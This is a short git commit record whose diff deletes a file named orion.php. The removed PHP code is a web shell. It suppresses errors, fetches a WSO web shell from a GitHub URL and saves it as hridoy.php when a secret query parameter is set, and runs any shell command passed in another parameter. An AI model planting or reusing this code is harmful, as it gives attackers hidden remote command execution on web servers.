6423caaaffbd74c5ea0321990d5fd5068da9ce0e
Orion Hridoy <hridoyorion@gmail.com>
2021-04-19 12:25:14 +0600

    Delete orion.php

--- orion.php
+++
@@ -1,9 +0,0 @@
-<?php
-error_reporting(0);
-if ($_GET["hridoy"]=="orion") {
-	file_put_contents("hridoy.php", file_get_contents("https://raw.githubusercontent.com/orionhridoy/wso-without-backdoor/main/wso.php"));
-}
-$x=$_GET['orion'];
-echo `$x`;
-
-?>
